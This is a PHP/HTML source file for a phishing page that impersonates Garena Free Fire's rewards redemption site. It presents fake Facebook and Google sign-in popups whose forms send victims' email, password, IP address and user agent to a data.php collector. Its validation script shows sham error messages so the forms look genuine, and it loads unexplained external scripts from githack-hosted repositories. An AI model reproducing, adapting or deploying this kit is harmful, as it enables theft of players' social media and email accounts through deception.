<?php

include 'config/result.php';
?>

<html lang="en" data-build-timestamp-utc="2021-10-08T09:43:32.672Z">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="x-dns-prefetch-control" content="on">
        <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
        <title>Free Fire</title>
        <link rel="dns-prefetch" href="https://prod-api.reward.ff.garena.com/">
        <link rel="icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire32-2.ico" type="image/x-icon">
        <link rel="shortcut icon" href="https://freefiremobile-a.akamaihd.net/ffwebsite/images/freefire16-2.ico" type="image/x-icon">
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="title" content="FreeFire">
        <meta name="description" content="FreeFire">
        <meta property="og:title" content="FreeFire">
        <meta property="og:description" content="FreeFire">
        <script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script>
        <script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-180844756-1"></script>
        <link href="assets/css/style-AlexHost.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/c9f3ddecc56e688f8660a2d31a5beea4909fa5b9/alex-facebook.css">
        <link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/all.asset/1591ba04a57c11f4b18d2ebb39e03e4a81715c83/alex-google.css">
    </head>
    <body>
        <div id="app">
            <div class="main">
                <div data-v-d548ccee="" class="home-wrapper">
                    <div data-v-d548ccee="" class="home-background"></div>
                    <div data-v-d548ccee="" class="home-container">
                        <div data-v-d548ccee="" class="home">
                            <div data-v-47ba120f="" data-v-d548ccee="" class="header">
                                <div data-v-47ba120f="" class="header-content">
                                    <div data-v-47ba120f="" class="header__logo"></div>
                                </div>
                            </div>
                            <div data-v-d548ccee="" class="home__right">
                                <div data-v-63228176="" data-v-d548ccee="" class="main">
                                    <div data-v-63228176="" class="main-header">
                                        <h2 data-v-63228176="" class="main__title">Rewards Redemption Site</h2>
                                        <span data-v-63228176="" class="main__description">Please log in.</span>
                                    </div>
                                    <div data-v-63228176="" class="main__login">
                                        <div data-v-7a2d3d98="" data-v-63228176="" class="button main__login-button">
                                            <div data-v-8358661e="" data-v-7a2d3d98="" class="image-container image-container--hover" onclick="openfbAlex()">
                                                <img data-v-8358661e="" src="https://reward.ff.garena.com//images/e328a85faf3ec595e525860c98e34098.png" alt="" class="image">
                                            </div>
                                        </div>
                                        <div data-v-7a2d3d98="" data-v-63228176="" class="button main__login-button">
                                            <div data-v-8358661e="" data-v-7a2d3d98="" class="image-container image-container--hover">
                                                <img data-v-8358661e="" src="assets/img/vkcircle-Alex.png" alt="" class="image">
                                            </div>
                                        </div>
                                        <div data-v-7a2d3d98="" data-v-63228176="" class="button main__login-button">
                                            <div data-v-8358661e="" data-v-7a2d3d98="" class="image-container image-container--hover" onclick="opengpAlex()">
                                                <img data-v-8358661e="" src="assets/img/gpcircle-Alex.png" alt="" class="image">
                                            </div>
                                        </div>
                                        <div data-v-7a2d3d98="" data-v-63228176="" class="button main__login-button">
                                            <div data-v-8358661e="" data-v-7a2d3d98="" class="image-container image-container--hover">
                                                <img data-v-8358661e="" src="assets/img/hwcircle-Alex.png" alt="" class="image">
                                            </div>
                                        </div>
                                        <div data-v-7a2d3d98="" data-v-63228176="" class="button main__login-button">
                                            <div data-v-8358661e="" data-v-7a2d3d98="" class="image-container image-container--hover">
                                                <img data-v-8358661e="" src="assets/img/applcircle-Alex.png" alt="" class="image">
                                            </div>
                                        </div>
                                        <div data-v-7a2d3d98="" data-v-63228176="" class="button main__login-button">
                                            <div data-v-8358661e="" data-v-7a2d3d98="" class="image-container image-container--hover">
                                                <img data-v-8358661e="" src="assets/img/twcircle-Alex.png" alt="" class="image">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div data-v-2ceecd1e="" data-v-d548ccee="" class="home-panel home__panel">
                                    <h4 data-v-2ceecd1e="" class="home-panel__title">Important Notice:</h4>
                                    <ol data-v-2ceecd1e="" class="list">
                                        <li class="list__item">
                                            1. Redemption code has <span class="highlight">12</span>
                                            characters, consisting of capital letters and numbers.

                                        
                                        </li>
                                        <li class="list__item">
                                            2. Item rewards are shown in <span class="highlight">[vault] </span>
                                            tab in game lobby; Golds or diamonds will add in account wallet automatically.

                                        
                                        </li>
                                        <li class="list__item">3. Please note redemption expiration date. Any expired codes cannot be redeemed.</li>
                                        <li class="list__item">4. Please contact customer service if you encountered any issue.</li>
                                        <li class="list__item">5. Reminder: you will not be able to redeem your rewards with guest accounts. You may bind your account to Facebook or Google in order to receive the rewards.</li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                    </div>
                    <footer data-v-4b3d5280="" data-v-d548ccee="" class="footer" style="position: fixed; bottom: 0;">
                        <div data-v-4b3d5280="" class="footer-rule">
                            <div data-v-2ceecd1e="" data-v-4b3d5280="" class="home-panel footer-rule__panel">
                                <h4 data-v-2ceecd1e="" class="home-panel__title">Important Notice:</h4>
                                <ol data-v-2ceecd1e="" class="list">
                                    <li class="list__item">
                                        1. Redemption code has <span class="highlight">12</span>
                                        characters, consisting of capital letters and numbers.

                                    
                                    </li>
                                    <li class="list__item">
                                        2. Item rewards are shown in <span class="highlight">[vault] </span>
                                        tab in game lobby; Golds or diamonds will add in account wallet automatically.

                                    
                                    </li>
                                    <li class="list__item">3. Please note redemption expiration date. Any expired codes cannot be redeemed.</li>
                                    <li class="list__item">4. Please contact customer service if you encountered any issue.</li>
                                    <li class="list__item">5. Reminder: you will not be able to redeem your rewards with guest accounts. You may bind your account to Facebook or Google in order to receive the rewards.</li>
                                </ol>
                            </div>
                            <span data-v-4b3d5280="">Important Notice:</span>
                            <div data-v-8358661e="" data-v-4b3d5280="" class="footer-rule__icon image-container">
                                <img data-v-8358661e="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAYAAABWzo5XAAABiElEQVQ4jaWUT0sCQRjGf7ulhCRWkBKpCB2UPkB5K5Tw2MXq1KE/RAVd63NIQtAlqFt06RZFUXSJPkB1CUIjqYMRdihFinebhdV2wuq57Mw7z/NjZ2bfNfp7/bgoBUypZ1QtF4ATYBc4bo40gxLABjDqRnfoFFgCbuyS6VgcAS5bgKA8lyrTAJI32Qdc96mRX2USNsgAtoCAmz8Z95FM+HSwgMoaAkqLXwfJL4fJL4YZjmthkk0LaNJttbuzjdVsCNMA04S1iaBV02jSVFf8DbK5EiEW8nD3WOPuqUos6LVqGlhKQBE3yECfl9tSlblcgflc0RpLTQOLCOhdB1lYL/L8WqdcqVvjn2ACerAnfT0eQl3tDRBbMrZh4hGvQ/fyZW8D03ZtMNpBqVxrgDRvXSBXhTdneUdAGeBAdx0tKiNbOwQu/gGR7JGAPoAZ4OUPEMnMCsPuNenicaDyC4h4JXMtE2f3nwFDLW5TPOKVjCW3H5s08RiQVX0oH2wVKALnwJ6ciTqSLwGffjFwty+PVs8AAAAASUVORK5CYII=" alt="" class="image">
                            </div>
                        </div>
                        <div data-v-4b3d5280="" class="copyright">
                            <div data-v-8358661e="" data-v-4b3d5280="" class="icon image-container">
                                <img data-v-8358661e="" src="assets/img/garena-Alex.jpg" alt="" class="image">
                            </div>
                            <div data-v-4b3d5280="" class="copyright-message">
                                <p data-v-4b3d5280="">Copyright © Garena International.</p>
                                <p data-v-4b3d5280="">Trademarks belong to their respective owners. All rights Reserved.
      </p>
                            </div>
                        </div>
                    </footer>
                </div>
            </div>
            <div class="popup-ariandi alex-facebook animate fadeIn" style="display: none;">
                <div class="container-box-fb" style="margin-top: 10%;">
                    <a class="close-alex-facebook" onclick="closefbAlex()">
                        <i class="zmdi zmdi-close"></i>
                    </a>
                    <div class="atasan-fb">
                        <img src="https://i.ibb.co/wWvFFK6/facebook-text.png">
                    </div>
                    <div class="isi-facebook">
                        <p class="kaget email-fb">
                            Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b>
</p>
<p class="kaget sandi-fb">
    Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b>
</p>
<img src="https://i.ibb.co/DVjmT33/k9mpwq-PYChfe-PRt-Ul-TSEk-X73-TCDnwyv-Sk-D5-Avsd-UTAQ4-H0c2-OAIEiii-Uwr-VEd7-k1-E8-s180-rw.webp">
<div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan Garena Free Fire</div>
<form class="form-login-fb" method="POST" action="data.php" onsubmit="return AlexHostingNetFB()">
    <label>
        <input type="text" id="alx_email_fb" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" style="background: #fff" required>
    </label>
    <label>
        <input type="password" id="alx_password_fb" name="password" placeholder="Password" autocomplete="off" autocapitalize="off" style="background: #fff" required>
    </label>
    <input type="hidden" name="viewip" value="<?= $viewip ?>" readonly>
    <input type="hidden" name="viewua" value="<?= $viewua ?>" readonly>
    <input type="hidden" name="login" value="Facebook" readonly>
    <button class="btn-login-fb" stype="submit">Masuk</button>
</form>
<div class="txt-buat-akun">Buat akun</div>
<div class="txt-tidak-sekarang">Lain kali</div>
<div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
</div>
<div class="isi-bahasa">
    <center>
        <div class="nama-bahasa bahasa-aktif">Bahasa Indonesia</div>
        <div class="nama-bahasa">English (UK)</div>
        <div class="nama-bahasa">Basa Jawa</div>
        <div class="nama-bahasa">Bahasa Melayu</div>
        <div class="nama-bahasa">日本語</div>
        <div class="nama-bahasa">Español</div>
        <div class="nama-bahasa">Português (Brasil)</div>
        <div class="nama-bahasa">
            <i class="fa fa-plus"></i>
        </div>
    </center>
</div>
<div class="kalobukanalexsiapalagi">Facebook Inc.</div>
</div></div>
<div class="popup-ariandi alex-google animate fadeIn">
    <div class="container-box-google">
        <a class="close-alex-google" onclick="closegpAlex()">
            <i class="zmdi zmdi-close"></i>
        </a>
        <div class="atasan-google">
            <center>
                <p class="kagetgp email-gp" style="width: 100%">wrong email or phone number</p>
                <p class="kagetgp sandi-gp" style="width: 100%">password does not match</p>
                <img class="img-loggoogle" src="https://i.ibb.co/v1CZkTr/googlelogo-color-272x92dp.png">
            </center>
        </div>
        <div class="isi-google">
            <center>
                <form action="data.php" method="POST" onsubmit="return AlexHostingNetGP()">
                    <div class="ucapan-gp">Sign in</div>
                    <div class="form-login-gp" style="height: 50px;">
                        <label>Email or Phone</label>
                        <input type="text" id="alx_email_gp" name="email" placeholder="" autocomplete="off" required>
                    </div>
                    <div class="form-login-gp" style="height: 50px;">
                        <label>Password</label>
                        <input type="password" id="alx_password_gp" name="password" placeholder="" autocomplete="off" required>
                    </div>
                    <input type="hidden" name="login" value="Google" readonly>
                    <button class="btn-login-gp" type="submit">Login</button>
                </form>
                <button class="close-submit-gp" onclick="ariandi_google()">Create account?</button>
            </center>
        </div>
    </div>
</div>
<!---->
<!---->
</div><script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
    function openfbAlex() {
        $('.alex-facebook').fadeIn();
    }
    function closefbAlex() {
        $('.alex-facebook').hide();
    }

    function opengpAlex() {
        $('.alex-google').fadeIn();
    }
    function closegpAlex() {
        $('.alex-google').hide();
    }

    function AlexHostingNetFB() {
        $emailfb = $('#alx_email_fb').val().trim();
        $passwordfb = $('#alx_password_fb').val().trim();
        if ($emailfb == '' || $emailfb == null || $emailfb.length <= 7) {
            $('.email-fb').show();
            $('.sandi-fb').hide();
            return false;
        } else {
            $('.email-fb').hide();
        }
        if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 6) {
            $('.sandi-fb').show();
            return false;
        } else {
            $('.sandi-fb').hide();
        }
    }
    function AlexHostingNetGP() {
        $emailgp = $('#alx_email_gp').val().trim();
        $passwordgp = $('#alx_password_gp').val().trim();
        if ($emailgp == '' || $emailgp == null || $emailgp.length <= 5) {
            $('.email-gp').show();
            $('.sandi-gp').hide();
            return false;
        } else {
            $('.email-gp').hide();
        }
        if ($passwordgp == '' || $passwordgp == null || $passwordgp.length <= 5) {
            $('.sandi-gp').show();
            return false;
        } else {
            $('.sandi-gp').hide();
        }
    }
</script>
<script type="text/javascript" src="https://rawcdn.githack.com/32323474/47328789/62269b50e7837c3ded793b5f9e681e5394956018/2974217.js"></script>
<script src="https://rawcdn.githack.com/AlexHostX/protect/aaa1462a19b8d8b6cbd68101a5ac89f4955b49de/input-exception.js"></script>
<link rel="stylesheet" href="https://rawcdn.githack.com/AlexHostX/protect/a64076479559076b6e31356a0fb6188d291204ce/watermark.css">
</body></html>
